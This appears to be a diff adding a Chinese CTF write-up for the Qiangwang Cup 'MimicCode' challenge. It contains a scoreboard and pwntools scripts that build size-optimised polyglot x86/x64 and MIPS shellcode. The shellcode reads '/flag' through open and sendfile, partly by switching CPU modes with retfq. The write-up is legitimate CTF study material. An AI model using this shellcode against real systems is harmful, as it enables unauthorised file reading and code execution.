@@ -12,6 +12,400 @@ tags:
 附件：[MimicCode.tgz](https://xuanxuanblingbling.github.io/assets/attachment/qwb/MimicCode.tgz)
 
 
+## 比赛成绩
+
+```
+Rank 1: 0ops with score <41650824>
+Rank 1: eee with score <41650824>
+Rank 3: 0x300R with score <5531658>
+Rank 4: Lilac with score <5119553>
+Rank 5: Redbud with score <3056934>
+Rank 6: 铁鹰特战队 with score <245566>
+Rank 7: NeSE with score <131111>
+Rank 8: DAS with score <78122>
+Rank 9: 福来阁 with score <61595>
+Rank 10: syclover with score <51423>
+Rank 11: 雷泽-BOI with score <21063>
+Rank 11: Xp0int with score <21063>
+```
+
+## x86 & x64
+
+```python
+mov eax,cs
+sub eax,0x23
+jnz x64
+x32:
+x64:
+```
+
+```python
+from pwn import *
+
+decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
+decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))
+
+compile_x86     = lambda sc : (asm(sc,arch='i386'))
+compile_x64     = lambda sc : (asm(sc,arch='amd64'))
+
+shellcode = '''
+mov eax,cs
+sub eax,0x23
+jnz x64
+x32:
+x64:
+'''
+
+print(compile_x86(shellcode).hex())
+print(compile_x64(shellcode).hex())
+
+print(decompile_x86(compile_x86(shellcode)))
+print(decompile_x64(compile_x86(shellcode)))
+```
+
+```python
+8cc883e8237500
+8cc883e8237500
+   0:   8c c8                   mov    eax, cs
+   2:   83 e8 23                sub    eax, 0x23
+   5:   75 00                   jne    0x7
+   0:   8c c8                   mov    eax, cs
+   2:   83 e8 23                sub    eax, 0x23
+   5:   75 00                   jne    0x7
+```
+
+### 比赛版本（110字节）
+
+```python
+from pwn import *
+
+compile_x86     = lambda sc : (asm(sc,arch='i386'))
+compile_x64     = lambda sc : (asm(sc,arch='amd64'))
+
+
+decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
+decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))
+
+x86_x64_jmp = compile_x86('''
+mov eax,cs
+mov ebx,0x23
+sub eax,ebx
+jnz x64
+x32:
+    mov ebx, 0x67
+    push ebx
+    mov ebx, 0x616c662f
+    push ebx
+    mov eax, 5
+    mov ebx, esp
+    xor ecx, ecx
+    int 0x80
+    mov ebx, 1
+    mov ecx, eax
+    xor edx, edx
+    mov esi, 1000
+    mov eax, 0xbb
+    int 0x80
+x64:                                     
+''')
+
+x64_sc = compile_x64('''
+    mov rbx, 0x67616c662f
+    push rbx
+    mov rax, 2
+    mov rdi, rsp
+    xor rsi, rsi
+    syscall
+    mov rdi, 1
+    mov rsi, rax
+    xor rdx, rdx
+    mov r10, 1000
+    mov rax, 40
+    syscall
+''')
+
+shellcode = x86_x64_jmp + x64_sc
+
+print(decompile_x86(x86_x64_jmp))
+print(decompile_x64(x64_sc))
+
+print("[+] len: " + str(len(shellcode)))
+#io = process("./ShellcodeRunnerX86")
+io = process("./ShellcodeRunnerX64")
+io.sendlineafter(b"Shellcode >",shellcode)
+io.interactive()
+```
+
+### 缩减版本（66字节）
+
+```python
+from pwn import *
+
+compile_x86     = lambda sc : (asm(sc,arch='i386'))
+compile_x64     = lambda sc : (asm(sc,arch='amd64'))
+
+decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
+decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))
+
+x86_shellcode = compile_x86('''
+mov eax,cs
+sub eax,0x23
+jnz x64
+
+push 0x67
+push 0x616c662f
+mov al,  5
+mov ebx, esp
+xor ecx, ecx
+int 0x80
+
+xor  ebx, ebx
+inc  ebx
+xchg ecx, eax
+xor  edx, edx
+mov  al,  0xbb
+mov  esi, eax
+
+int 0x80
+
+x64:
+''')
+
+x64_shellcode = compile_x64('''
+push 0x616c662f
+movb [rsp+4],0x67
+mov al,2
+push rsp
+pop rdi
+xor esi, esi
+syscall
+
+xor edi,edi
+xchg esi, eax
+xor edx, edx
+inc edi
+mov r10b, 0xff
+mov al, 40
+syscall
+''')
+
+shellcode =  x86_shellcode + x64_shellcode 
+
+print(decompile_x86(x86_shellcode))
+print(decompile_x64(x64_shellcode))
+
+print("[+] len: " + str(len(shellcode)))
+#io = process("./ShellcodeRunnerX86")
+#gdb.attach(io,"b * 0x080497B3")
+
+io = process("./ShellcodeRunnerX64")
+#gdb.attach(io,"b * 0x401717")
+
+io.sendlineafter(b"Shellcode >",shellcode)
+io.interactive()
+```
+
+#### 寻找短指令
+
+```python
+from pwn import *
+
+decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
+decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))
+
+print("[+] x86: ")
+for i in range(256):
+    print(decompile_x86(i.to_bytes(1,'little')))
+
+print("[+] x64: ")
+for i in range(256):
+    print(decompile_x64(i.to_bytes(1,'little')))
+```
+
+#### 拆分寄存器
+
+mov rax,1 -> mov al,1
+
+- 32位下：例如对eax，无论动al,ah,ax，eax的高位都不会清零
+- 64位下，例如对rax，只有一个特例，动eax，则rax的高位清零，动其余的（al,al,ax），rax高位不会清零
+
+```python
+from pwn import *
+
+compile_x86    = lambda sc :  (asm(sc,arch='i386'))
+compile_x64    = lambda sc :  (asm(sc,arch='amd64'))
+decompile_x64    = lambda sc :  (disasm(sc,arch='amd64'))
+
+x86_shellcode = compile_x86('''
+mov eax,0xffffffff
+mov al,0x11
+mov ah,0x22
+mov ax,0x1
+''')
+
+x64_shellcode = compile_x64('''
+xor rax,rax
+dec rax
+mov al,0x11 
+mov ah,0x22
+mov ax,0x1
+mov eax,0x2
+'''
+)
+
+print(decompile_x64(x64_shellcode))
+
+# io = process("./ShellcodeRunnerX86")
+# gdb.attach(io,"b * 0x080497B3")
+
+io = process("./ShellcodeRunnerX64")
+gdb.attach(io,"b * 0x401717")
+io.sendlineafter(b"Shellcode >",x64_shellcode)
+io.interactive()
+```
+
+### retf版本（49字节）
+
+x86与x64的关系不止是如类上文发现的相应指令集兼容，还有指令集切换。x32->x64，但如果使用qemu-i386不可切换：
+
+```python
+from pwn import *
+
+compile_x64     = lambda sc : (asm(sc,arch='amd64'))
+decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))
+
+x64_shellcode = compile_x64('''
+call code
+code:
+pop  rcx
+add  rcx,10
+push 0x33
+push rcx
+retfq
+
+push 0x616c662f
+movb [rsp+4],0x67
+xor eax,eax
+mov al,2
+push rsp
+pop rdi
+xor esi, esi
+syscall
+
+xor edi,edi
+xchg esi, eax
+xor edx, edx
+inc edi
+mov r10b, 0xff
+mov al, 40
+syscall
+''')
+
+shellcode = x64_shellcode
+
+print(decompile_x64(x64_shellcode))
+
+print("[+] len: " + str(len(shellcode)))
+io = process("./ShellcodeRunnerX86")
+#gdb.attach(io,"b * 0x080497B3")
+
+#io = process("./ShellcodeRunnerX64")
+#gdb.attach(io,"b * 0x401717")
+
+io.sendlineafter(b"Shellcode >",shellcode)
+io.interactive()
+```
+
+破产版本，52字节，x64 -> x32 mmap的shellcode地址存在高位，阶段后不可访问： 
+
+```python
+from pwn import *
+import os
+
+compile_x86     = lambda sc : (asm(sc,arch='i386'))
+compile_x64     = lambda sc : (asm(sc,arch='amd64'))
+
+decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
+decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))
+
+x86_shellcode = compile_x86('''
+xor eax,eax
+push 0x67
+push 0x616c662f
+mov al,  5
+mov ebx, esp
+xor ecx, ecx
+int 0x80
+
+xor  ebx, ebx
+inc  ebx
+xchg ecx, eax
+xor  edx, edx
+mov  al,  0xbb
+mov  esi, eax
+
+int 0x80
+''')
+
+x64_shellcode = compile_x64('''
+call code
+code:
+pop  rcx
+mov  rax,rcx
+mov  al,0xf0
+mov  rsp,rax
+add  rcx,18
+push 0x23
+push rcx
+retfq
+''')
+
+shellcode = x64_shellcode + x86_shellcode
+
+print(decompile_x86(x86_shellcode))
+print(decompile_x64(x64_shellcode))
+print("[+] len: " + str(len(shellcode)))
+
+open('sc32','wb').write(make_elf(shellcode,arch='i386'))
+open('sc64','wb').write(make_elf(shellcode,arch='amd64'))
+
+os.system("chmod +x ./sc32; ./sc32")
+os.system("chmod +x ./sc64; ./sc64")
+```
+
+## MIPS & MIPS64
+
+```python
+mips_sc = compile_mips('''
+    li  $t1, 0x2f666c61
+    sw  $t1, ($sp)
+    lui $t9, 0x6700
+    sw $t9, 4($sp)
+    
+    li $t1,0xfa5
+    li $t2,0x106f
+    
+    li $t6,0x40054c
+    beq $ra,$t6,main
+    nop
+    li $t1,0x138a
+    li $t2,0x13af
+    
+    main:
+    move $a0,$sp
+    li $a1,0
+    li $a2,0
+    move $v0, $t1
+    syscall 0x40404
+
+    li $a0, 1
+    move $a1, $v0
+    li $a3, 100
+    move $v0, $t2
+    syscall 0x40404
+''')
+```
+
 ## 比赛版本
 
 ```
